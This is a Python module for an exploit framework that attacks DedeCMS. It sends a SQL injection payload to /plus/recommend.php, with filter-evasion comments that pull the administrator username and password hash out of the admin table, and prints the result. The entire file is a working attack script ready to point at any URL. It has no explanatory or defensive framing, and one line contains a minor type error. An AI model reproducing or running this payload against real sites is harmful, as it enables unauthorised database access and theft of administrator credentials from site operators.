#!/usr/bin/python
# -*- coding:utf8 -*-
from zerooosploit.exploits import ExploitAggregate
from zerooosploit.color import *
import requests
import re


class Zerooosploit(ExploitAggregate):

    def __init__(self):
        super(self.__class__, self).__init__()
        self.info = {
            'name': 'dedecms_injection',
            'product': 'dedecms',
            'authors': '01sec',
            'ref': '',
            'cve': '',
            'create_date': '2019-09-18'
        }

        self.option = {
            'url': {'default': ''}
        }

    def exploit(self):
        url = self.get_options('url')
        payload = '/plus/recommend.php?action=&aid=1&_FILES[type][tmp_name]=\%27%20or%20mid=@`\%27`%20/*!50000union*//*!50000select*/1,2,3,(select%20CONCAT(0x7c,userid,0x7c,pwd)+from+`%23@__admin`%20limit+0,1),5,6,7,8,9%23&_FILES[type][name]=1.jpg&_FILES[type][type]=application/octet-stream&_FILES[type][size]=4294'

        try:
            r = requests.get(url=url + payload, timeout=60)
            req = re.findall('<h2>(.*?)</h2>', r.text, re.S)
            if req:
                print_green('[+] Exploit succeed, ' + req)
                print_blue('[*] Exploit completed')
            else:
                print_blue('[*] Exploit completed')
        except Exception as e:
            print_red('[-] Exploit failed: ' + str(e))
